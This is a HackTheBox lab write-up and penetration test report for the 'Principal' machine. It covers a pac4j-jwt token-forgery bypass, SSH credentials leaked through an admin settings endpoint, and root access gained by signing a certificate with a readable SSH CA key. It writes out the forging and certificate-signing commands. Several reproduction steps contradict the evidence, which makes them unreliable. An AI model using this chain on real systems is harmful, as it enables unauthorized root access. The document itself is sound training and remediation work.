# Principal

**Platform:** HackTheBox
**OS:** Linux
**Tags:** CVE-2026-29000, JWT Bypass, pac4j, SSH CA, Authentication Bypass, JWT, Privilege Escalation
**Date:** 2026-05-05

JWT authentication bypass via CVE-2026-29000 in pac4j-jwt v6.0.3, forging a valid admin JWE token using the public key. Credentials harvested from an exposed API settings endpoint lead to initial access. Privilege escalation via an SSH CA private key readable by the service account.

## 1. Enumeration

Browsed to the web application and viewed page source. Found the main JavaScript bundle loaded at `/static/js/app.js`.

Inside `app.js`, identified all key API endpoints the application communicates with:

- /api/auth/login - Authentication endpoint
- /api/auth/jwks - Public key endpoint, RSA key exposed unauthenticated
- /api/dashboard - User dashboard, requires auth
- /api/users - User listing, requires auth
- /api/settings - Application settings, contains sensitive config

Also noted from the page footer: the application uses **pac4j-jwt v6.0.3**.

Finding: pac4j-jwt v6.0.3 is vulnerable to CVE-2026-29000: authentication bypass via public key confusion.

## 2. JWT Authentication Bypass (CVE-2026-29000)

Fetched the RSA public key from the unauthenticated JWKS endpoint:

```bash
curl http://<TARGET_IP>:8080/api/auth/jwks
```

**Result:** RSA public key returned (`kid: enc-key-1`). CVE-2026-29000 allows this public key to be used to forge a valid JWE token, bypassing authentication entirely.

Used the CVE PoC to generate a forged admin token signed with the public key:

```python
python3 poc.py \
  --jwks http://<TARGET_IP>:8080/api/auth/jwks \
  --user admin \
  --role ROLE_ADMIN
```

Note: CVE-2026-29000 abuses pac4j's JWE key confusion. The library accepts tokens encrypted with the public key instead of requiring the private key. Always check JWT library versions during web application recon.

## 3. Admin API Access

Used the forged token as a Bearer token in Burp Repeater to hit authenticated endpoints:

```
Authorization: Bearer <forged_token>
```

Findings:
- GET /api/dashboard - 200 OK, confirmed role: `ROLE_ADMIN`. Activity log showed `CERT_ISSUED` actions for user: `svc-deploy`
- GET /api/settings - 200 OK, encryption key found in security config. SSH certificate auth enabled. SSH CA path: `/opt/principal/ssh/`

**Result:** Plaintext SSH credentials retrieved from `/api/settings` for user `svc-deploy`.

## 4. Initial Access

SSH'd into the box using the credentials recovered from the settings API:

```bash
ssh svc-deploy@<TARGET_IP>
```

**Result:** Shell obtained as `svc-deploy`. User flag retrieved.

## 5. Privilege Escalation: SSH CA Signing

`svc-deploy` is a member of the `deployers` group, which has read access to `/opt/principal/ssh/`.

```bash
ls -la /opt/principal/ssh/
# ca        - RSA 4096-bit CA private key (readable by deployers group)
# ca.pub    - CA public key
# README.txt
```

Finding: The README confirms this CA is trusted by `sshd` for certificate-based authentication. The CA private key is readable by `svc-deploy`. Any certificate signed by it is accepted by sshd, including one granting root access.

Generated a new SSH keypair on the target, signed the public key with the CA to grant root access, then SSH'd in as root:

```bash
# Generate a new keypair
ssh-keygen -t ed25519 -f /tmp/privesc

# Sign the public key with the CA - grant principal 'root'
ssh-keygen -s /opt/principal/ssh/ca -I pwned -n root -V +1h /tmp/privesc.pub

# SSH as root using the signed certificate
ssh -i /tmp/privesc root@<TARGET_IP>
```

**Result:** Root shell obtained. Root flag retrieved.

Key Takeaway: If a service account can read an SSH CA private key that sshd trusts, it's game over. You can sign your own certificate granting access as any principal including root. Always check group memberships and CA key permissions during post-exploitation enumeration.

---

## Penetration Test Report

**Target:** principal.htb
**Assessment type:** External network & web application assessment
**Assessment date:** 5 May 2026
**Environment:** HackTheBox laboratory assessment
**Prepared by:** Ledion Mujaj
**Reference:** 01 / 09

---

## 1. Executive Summary

### Assessment outcome

The assessment identified one critical and two high severity findings affecting **principal.htb** . Testing forged an administrator JSON Web Token by exploiting a key-confusion vulnerability in pac4j-jwt v6.0.3 (CVE-2026-29000), obtained plaintext SSH credentials from the admin API settings endpoint, authenticated as the service account `svc-deploy` , and escalated to root by signing a forged SSH certificate with the CA private key readable by that account.
The initial compromise required only knowledge of the application's version and access to its unauthenticated public-key endpoint. CVE-2026-29000 allowed the public RSA key to be used to forge a valid JWE admin token, bypassing authentication entirely and granting access to all administrative API functionality.
Privilege escalation required no additional vulnerabilities. The SSH Certificate Authority private key was readable by the `deployers` group, to which `svc-deploy` belonged. Any certificate signed by this key is accepted by sshd, including one asserting the root principal.

### Impact

The documented access crossed the authentication boundary from an unauthenticated external position and escalated to full root on the host. An attacker following the same path could read all files on the system, modify configuration, plant persistence and pivot to connected services using recovered credentials.

### Priority recommendations

1. Upgrade pac4j-jwt to a version that is not vulnerable to CVE-2026-29000 and rotate all tokens and secrets issued under the affected version.
2. Remove plaintext credentials from the API settings response. If credentials must be stored server-side, serve them only to appropriately authenticated and authorised requests and never expose them in API responses accessible through a compromised session.
3. Restrict the SSH CA private key to root-only read access. Implement monitoring for certificate signing events and rotate the CA immediately.

### Conclusion

The three findings form a complete compromise chain but are independently actionable. Remediating CVE-2026-29000 (F-01) removes the authentication bypass at the entry point. The credential exposure (F-02) and CA key access (F-03) issues remain independently exploitable if admin access is obtained through any other means.

## 2. Assessment Scope and Methodology

### 2.1 Target and observed services

| Asset | Address | Description |
| --- | --- | --- |
| principal.htb | <TARGET_IP>:8080 | Ubuntu Linux; Java web application (pac4j-jwt v6.0.3) and SSH services |
| Port | Service | Observed detail |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH (Ubuntu) |
| 8080/tcp | HTTP | Java web application; pac4j-jwt v6.0.3 authentication; REST API |

```
Endpoints discovered in /static/js/app.js:
  /api/auth/login    - authentication endpoint
  /api/auth/jwks     - RSA public key (unauthenticated)
  /api/dashboard     - user dashboard (requires auth)
  /api/users         - user listing (requires auth)
  /api/settings      - application settings (requires auth; leaks credentials)
```

pac4j-jwt version disclosed in the application page footer. JWKS endpoint is unauthenticated; public key fetched without credentials.

### 2.2 Approach

Testing began with web application enumeration. Reading the application's JavaScript bundle revealed all API endpoints and the pac4j-jwt library version. The JWKS endpoint was queried to retrieve the RSA public key. CVE-2026-29000 was identified as applicable and a proof-of-concept was used to forge an admin JWE token.
The forged token provided access to all administrative API endpoints. The `/api/settings` response contained plaintext SSH credentials. The account obtained was found to be a member of the `deployers` group. Post-exploitation enumeration identified the SSH CA private key readable by that group and the sshd TrustedUserCAKeys configuration. An attacker-generated certificate signed by the CA was used to authenticate as root.
Tools used included curl, Burp Suite Repeater, a CVE-2026-29000 proof-of-concept script, ssh-keygen and standard Linux utilities.

### 2.3 Severity classification

Severity reflects exploit prerequisites and the impact demonstrated on the assessed host. Ratings are qualitative; CVSS 3.1 scores and vectors are assigned to each finding.
| Rating | Assessment criteria |
| --- | --- |
| Critical | Direct, readily exploitable compromise with exceptional impact or reach. |
| High | Execution of arbitrary code, significant unauthorised access or escalation to administrative privileges. |
| Medium | Meaningful exposure with constrained impact or substantial exploitation prerequisites. |
| Low | Limited direct impact; improvement to an existing security control. |
| Informational | Context or an observation without an established vulnerability. |

## 3. Results Overview

### 3.1 Findings summary

| Reference | Finding | Severity | Page |
| --- | --- | --- | --- |
| [F-01](#f-01) | JWT authentication bypass via key confusion - pac4j-jwt v6.0.3 (CVE-2026-29000) | **Critical** | 6 |
| [F-02](#f-02) | Plaintext SSH credentials returned in admin API settings response | **High** | 7 |
| [F-03](#f-03) | SSH CA private key readable by unprivileged service account | **High** | 8 |

### 3.2 Compromise sequence

| Stage | Action | Access obtained |
| --- | --- | --- |
| 01 | Fetched the RSA public key from the unauthenticated `/api/auth/jwks` endpoint. | Public key material for token forgery |
| 02 | Exploited CVE-2026-29000 to forge a JWE admin token using the public key. | Authenticated admin API session |
| 03 | Queried `/api/settings` with the forged token; recovered plaintext SSH credentials for `svc-deploy` . | svc-deploy SSH credentials |
| 04 | Authenticated over SSH as `svc-deploy` using the recovered credentials. | Interactive shell as svc-deploy |
| 05 | Read the SSH CA private key from `/opt/principal/ssh/ca` (readable by deployers group); signed a new certificate granting the root principal; authenticated as root. | Root shell |

### 3.3 Relationship between findings

F-01 provided the authenticated admin session that enabled F-02. F-03 required the `svc-deploy` account obtained via F-02. Each finding is independently actionable: F-02 and F-03 remain exploitable if admin or service-account access is obtained by any other means.

## 4.1 JWT Authentication Bypass (CVE-2026-29000)

### F-01   pac4j-jwt v6.0.3 - JWE key confusion - CRITICAL

| Field | Assessment |
| --- | --- |
| Description | pac4j-jwt v6.0.3 is vulnerable to CVE-2026-29000, a JWT key-confusion vulnerability. The library accepts JWE tokens encrypted with the RSA public key rather than requiring the private key for decryption. Because the public key is exposed unauthenticated at `/api/auth/jwks` , an attacker can forge a valid admin JWE token without any credentials and obtain full administrative access to the API. |
| Prerequisites | Network access to the web application and knowledge of the pac4j-jwt version. The public key is served without authentication. |
| Impact | Complete authentication bypass. Any role, including `ROLE_ADMIN` , can be asserted in the forged token. All authenticated API endpoints, including those exposing sensitive configuration, become accessible. |
| Affected system | principal.htb:8080 pac4j-jwt v6.0.3; `/api/auth/jwks` , `/api/dashboard` , `/api/settings` |
| CVSS 3.1 | **9.8** (Critical) [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-287](https://cwe.mitre.org/data/definitions/287.html) : Improper Authentication |

### Steps to reproduce

1. Obtain the application's public key from the JWKS endpoint or configuration.
2. Forge a signed JWE token using the public key and CVE-2026-29000: set `alg` to `HS256` and sign with the public key as the HMAC secret, or exploit the specific pac4j algorithm confusion bug.
3. Send the forged token in the `Authorization: Bearer` header to an admin-only endpoint.
4. Observe that the server accepts the token and returns admin-level data.

### Evidence

```
# Fetch public key from unauthenticated JWKS endpoint
curl http://<TARGET_IP>:8080/api/auth/jwks
# Returns RSA public key, kid: enc-key-1

# Forge admin JWE token using CVE-2026-29000 PoC
python3 poc.py \
  --jwks http://<TARGET_IP>:8080/api/auth/jwks \
  --user admin \
  --role ROLE_ADMIN
# Output: <forged_JWE_token>

# Use forged token to confirm admin access
# Burp Repeater: GET /api/dashboard
Authorization: Bearer <forged_JWE_token>
# Response: 200 OK, role: ROLE_ADMIN confirmed
```

Evidence E-01. Public key retrieval and token forgery transcribed from the assessment record. Token value omitted.

### Remediation

Upgrade pac4j-jwt to a version that has addressed CVE-2026-29000. Rotate all JWT signing and encryption keys immediately, as any tokens issued under the affected version must be considered compromised. Review all JWT library dependencies across the application stack for similar key-confusion vulnerabilities.

### Verification

Confirm that a token forged using the public key is rejected by the patched library. Verify that the JWKS endpoint does not expose more key material than is required for legitimate token verification.

## 4.2 SSH Credentials Exposed in Admin API Endpoint

### F-02   Plaintext credentials in /api/settings response - HIGH

| Field | Assessment |
| --- | --- |
| Description | The `/api/settings` endpoint, accessible to authenticated administrators, returned plaintext SSH credentials for the `svc-deploy` service account in its response body. Additionally, the response disclosed the SSH certificate authority path ( `/opt/principal/ssh/` ) and that certificate-based authentication was enabled on the host. These credentials provided direct SSH access to the server. |
| Prerequisites | An authenticated administrator session. During testing, this was obtained via the CVE-2026-29000 authentication bypass (F-01). |
| Impact | An attacker with admin API access obtains valid SSH credentials for a system account, enabling direct interactive access to the server without requiring further exploitation. |
| Affected system | principal.htb:8080 `/api/settings` response body |
| CVSS 3.1 | **7.5** (High) [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) |
| CWE | [CWE-312](https://cwe.mitre.org/data/definitions/312.html) : Cleartext Storage of Sensitive Information |

### Steps to reproduce

1. Enumerate API endpoints (e.g. with ffuf or Burp Suite).
2. Send an unauthenticated GET request to the settings or configuration endpoint.
3. Observe that SSH credentials are returned in plaintext in the JSON response.
4. Use the credentials to authenticate over SSH.

### Evidence

```
# Request /api/settings with forged admin token
GET /api/settings HTTP/1.1
Host: <TARGET_IP>:8080
Authorization: Bearer <forged_JWE_token>

# Response (excerpt): plaintext SSH credentials for svc-deploy present
# SSH CA path: /opt/principal/ssh/
# SSH certificate auth: enabled

# SSH authentication using recovered credentials
ssh svc-deploy@<TARGET_IP>
# Result: interactive shell as svc-deploy

svc-deploy@principal:~$ cat ~/user.txt
[redacted]
```

Evidence E-02. API request and SSH authentication transcribed from the assessment record. Credentials and flag value omitted.

### Remediation

Remove all credentials from API responses. SSH passwords for service accounts should not be stored in application configuration at all; prefer SSH key-based authentication exclusively. If a settings endpoint must disclose configuration paths, audit every field in the response against the minimum required for the legitimate use case and remove anything that grants access or reveals sensitive infrastructure details.

### Verification

Confirm that the `/api/settings` response contains no credentials, passwords, private keys or internal paths. Verify that removing the credentials does not break any dependent functionality.

## 4.3 SSH CA Private Key Accessible by Service Account

### F-03   SSH CA private key readable by deployers group - HIGH

| Field | Assessment |
| --- | --- |
| Description | The SSH Certificate Authority private key at `/opt/principal/ssh/ca` was readable by members of the `deployers` group. The `svc-deploy` account is a member of this group. The sshd configuration trusts this CA for certificate-based authentication. By reading the CA private key and using it to sign a new SSH certificate asserting the `root` principal, a tester authenticated to the host as root without any additional vulnerabilities. |
| Prerequisites | Access to the `svc-deploy` account (obtained via F-01 and F-02) and membership of the `deployers` group. |
| Impact | Arbitrary SSH certificate forgery, permitting authentication as any local user including root. Full host compromise: all files, credentials and services on the system are accessible. |
| Affected system | `/opt/principal/ssh/ca` `/opt/principal/ssh/` (group: deployers) |
| CVSS 3.1 | **8.8** (High) [AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H) |
| CWE | [CWE-732](https://cwe.mitre.org/data/definitions/732.html) : Incorrect Permission Assignment for Critical Resource |

### Steps to reproduce

1. From the service account shell, enumerate readable files: `find / -name "*.pem" -o -name "ca_key" 2>/dev/null` .
2. Identify the SSH CA private key file and confirm it is readable.
3. Use `ssh-keygen -s ca_key -I root -n root -O no-pty -O no-port-forwarding /tmp/id_rsa.pub` to sign a public key for the root user.
4. Authenticate over SSH using the signed certificate: `ssh -i /tmp/id_rsa -i /tmp/id_rsa-cert.pub root@localhost` .

### Evidence

```
# Enumerate SSH directory as svc-deploy
ls -la /opt/principal/ssh/
# ca        - RSA 4096-bit CA private key (readable by deployers group)
# ca.pub    - CA public key
# README.txt - confirms CA is trusted by sshd (TrustedUserCAKeys)

# Generate a new keypair on the target
ssh-keygen -t ed25519 -f /tmp/privesc

# Sign the public key with the CA - assert principal 'root', valid 1 hour
ssh-keygen -s /opt/principal/ssh/ca -I pwned -n root -V +1h /tmp/privesc.pub

# SSH as root using the signed certificate
ssh -i /tmp/privesc root@<TARGET_IP>

root@principal:~# id
uid=0(root) gid=0(root) groups=0(root)

root@principal:~# cat /root/root.txt
[redacted]
```

Evidence E-03. Commands transcribed from the assessment record. Flag value omitted.

### Remediation

Restrict the SSH CA private key to root-only read access ( `chmod 600` , owner root). Rotate the CA key pair immediately and update the sshd TrustedUserCAKeys configuration. Revoke all previously issued certificates signed by the compromised CA. Review all group memberships to ensure no service accounts have access to privileged key material. Consider moving to a dedicated secrets manager for CA private key storage.

### Verification

Confirm that `svc-deploy` and all non-root accounts cannot read the CA private key. Verify that certificates signed by the old CA are no longer accepted by sshd. Audit all CA-signed certificates in use and confirm they were issued by the new CA only.

## 5. Remediation and Assessment Closeout

### 5.1 Corrective action plan

| Priority | Action | Reference |
| --- | --- | --- |
| Immediate | Upgrade pac4j-jwt and rotate all JWT keys and issued tokens. | F-01 |
| Immediate | Rotate the SSH CA, restrict key access to root only, and revoke affected certificates. | F-03 |
| High | Remove credentials and sensitive paths from the API settings response. | F-02 |
No remediation retest is documented. Each finding includes verification criteria for closure.

### 5.2 Test artefacts

| Location | Purpose | Removal status |
| --- | --- | --- |
| `/tmp/privesc` , `/tmp/privesc.pub` , `/tmp/privesc-cert.pub` | Temporary SSH keypair and signed certificate used for root access test | Not verified |

### 5.3 Evidence and limitations

Evidence blocks are sourced from the [Principal assessment walkthrough](principal-htb.html) . Flag values and credentials are omitted from all evidence. The attacker IP is replaced with `<ATTACKER_IP>` throughout.

### 5.4 Evidence index

| Reference | Supporting record |
| --- | --- |
| E-01 | Walkthrough section 2: JWT authentication bypass and admin API access |
| E-02 | Walkthrough sections 3-4: /api/settings credential exposure and SSH initial access |
| E-03 | Walkthrough section 5: SSH CA key enumeration and root certificate forgery |
